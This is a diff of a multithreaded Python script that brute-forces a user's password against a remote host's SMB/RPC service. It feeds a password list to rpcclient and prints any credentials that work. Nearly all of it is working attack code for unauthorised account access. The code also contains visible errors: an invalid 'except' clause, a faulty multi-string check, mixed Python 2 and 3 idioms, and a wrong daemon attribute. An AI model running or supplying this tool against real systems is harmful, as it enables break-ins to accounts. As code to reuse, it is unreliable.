@@ -11,13 +11,7 @@ import time
 
 class workerthread(threading.Thread):
 
-    def __init__(
-        self,
-        rhost,
-        user,
-        q,
-        lc,
-        ):
+    def __init__(self, rhost, user, q, lc):
         threading.Thread.__init__(self)
         self.rhost = rhost
         self.user = user
@@ -28,22 +22,20 @@ class workerthread(threading.Thread):
         while True:
             try:
                 pwd = self.q.get().strip('\n')
-                out = s.Popen(["rpcclient", "-U", "{}%{}".format(self.user, pwd), self.rhost], stdout=s.PIPE>
+                out = s.run(["rpcclient", "-U", "{}%{}".format(self.user, pwd), self.rhost, "-c quit"], stdout=s.PIPE, stderr=s.PIPE, encoding="utf-8")
 
                 if ('Error' or 'DENIED' or 'TIMEOUT') not in out.stdout:
                     print 'Success! user:{} pass:{}'.format(self.user, pwd)
                     sys.exit()
 
-                if 'TIMEOUT' in out.stdout:
-                    print 'connection issues. exiting.'
+                elif 'TIMEOUT' in out.stdout:
+                    print 'Connection issues. exiting.'
                     sys.exit()
-
-                # print the queue size using qsize as queue len gets reduced on every queue.get()
-
-                print '{}/{} - {} failed.'.format(self.q.qsize(),
-                        self.lc, pwd)
-            except queue.Empty():
-
+                else:
+                    print '{}/{} - {} failed.'.format(self.q.qsize(), self.lc, pwd)
+            
+            except Exception e:
+                print (e)
                 return
 
             self.q.task_done()
@@ -57,7 +49,6 @@ def build_pwd_queue(pwdfile):
             linecount += 1
     return (pwdq, linecount)
 
-
 if __name__ == '__main__':
 
     p = argparse.ArgumentParser('Brute force w/ rpcclient')
@@ -70,16 +61,16 @@ if __name__ == '__main__':
 
     start = time.time()
 
-    (pwdq, lc) = build_pwd_queue(r.pwdfile)  # pass queue object to a variable, this queue object has been filled with passwords
+    (pwdq, lc) = build_pwd_queue(r.pwdfile) 
     threadlist = []
 
     for i in range(r.maxthread):
         worker = workerthread(r.rhost, r.user, pwdq, lc)
-        worker.setDaemon(True)
+        worker.Daemon = True
         worker.start()
         threadlist.append(worker)
 
-    pwdq.join()  # Queue.join() to pause until all threads have finished, then continue.
+    pwdq.join()  
 
     runtime = round(time.time() - start, 2)
     print 'Runtime: {}s'.format(runtime)
